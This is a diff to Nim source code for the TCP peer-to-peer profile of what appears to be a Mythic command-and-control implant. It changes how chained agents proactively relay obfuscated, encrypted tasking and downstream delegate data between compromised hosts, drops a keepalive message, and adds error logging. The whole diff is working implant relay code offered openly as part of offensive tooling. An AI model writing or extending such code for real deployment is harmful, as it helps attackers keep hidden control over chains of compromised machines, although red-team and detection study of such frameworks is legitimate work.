@@ -375,9 +375,32 @@ proc start*(profile: TcpProfile) {.async.} =
       
       while true:
         try:
-          # Wait for message from client
+          # Start receiving from parent (non-blocking future)
+          # While waiting, periodically check downstream P2P connections
+          # and relay data proactively (critical for multi-hop: HTTP <- TCP <- TCP)
           debug "[DEBUG] TCP P2P: Waiting for message from linking agent..."
-          let clientMsg = await receiveChunkedMessage(client)
+          let recvFut = receiveChunkedMessage(client)
+          
+          while not recvFut.finished:
+            # Check downstream connections for data to relay proactively
+            let (downDelegates, downEdges) = collectDownstreamDelegates(profile.callbackUuid)
+            if downDelegates.len > 0 or downEdges.len > 0:
+              let delegateResponse = %* {
+                obf("action"): obf("post_response"),
+                obf("responses"): []
+              }
+              if downDelegates.len > 0:
+                delegateResponse[obf("delegates")] = downDelegates
+                debug "[DEBUG] TCP P2P: Proactively relaying ", downDelegates.len, " downstream delegate(s)"
+              if downEdges.len > 0:
+                delegateResponse[obf("edges")] = downEdges
+                debug "[DEBUG] TCP P2P: Proactively relaying ", downEdges.len, " downstream edge(s)"
+              let encrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
+              await sendChunkedMessage(client, encrypted)
+            
+            await sleepAsync(200)  # Check every 200ms, also processes pending socket events
+          
+          let clientMsg = recvFut.read()
           if clientMsg.len == 0:
             debug "[DEBUG] TCP P2P: Client disconnected"
             break
@@ -402,6 +425,9 @@ proc start*(profile: TcpProfile) {.async.} =
               var chunksToSend = newJArray()
               
               for resp in responses:
+                if not resp.hasKey(obf("task_id")):
+                  debug "[DEBUG] TCP P2P: Skipping response without task_id"
+                  continue
                 let taskId = resp[obf("task_id")].getStr()
                 
                 # Handle chunk_data (Mythic sending file chunks to P2P agent for upload-type tasks)
@@ -617,16 +643,9 @@ proc start*(profile: TcpProfile) {.async.} =
                 let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                 await sendChunkedMessage(client, responseEncrypted)
               else:
-                # Always respond to keep the relay chain alive (multi-level P2P)
-                # Without this, the parent agent never gets data from us, Mythic never
-                # sends new delegates, and downstream responses get stuck permanently
-                let getTaskingMsg = %* {
-                  obf("action"): obf("get_tasking"),
-                  obf("tasking_size"): -1
-                }
-                debug "[DEBUG] TCP P2P: Sending get_tasking keepalive (no chunks, no downstream data)"
-                let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
-                await sendChunkedMessage(client, responseEncrypted)
+                # P2P agents are passive - they never send get_tasking.
+                # The egress agent drives communication by pushing data down.
+                discard
               continue
             
             # Check for action field
@@ -861,17 +880,12 @@ proc start*(profile: TcpProfile) {.async.} =
                     let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                     await sendChunkedMessage(client, responseEncrypted)
                   else:
-                    # Always respond to keep the relay chain alive (multi-level P2P)
-                    let getTaskingMsg = %* {
-                      obf("action"): obf("get_tasking"),
-                      obf("tasking_size"): -1
-                    }
-                    debug "[DEBUG] TCP P2P: Sending get_tasking keepalive (no tasks, no downstream data)"
-                    let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
-                    await sendChunkedMessage(client, responseEncrypted)
+                    # P2P agents are passive - they never send get_tasking.
+                    # The egress agent pushes data down and forwards responses back.
+                    discard
                   continue
-          except:
-            discard
+          except Exception as e:
+            debug "[DEBUG] TCP P2P: Error processing message: ", e.msg
           
         except Exception as e:
           debug "[DEBUG] TCP P2P: Error in client loop: ", e.msg
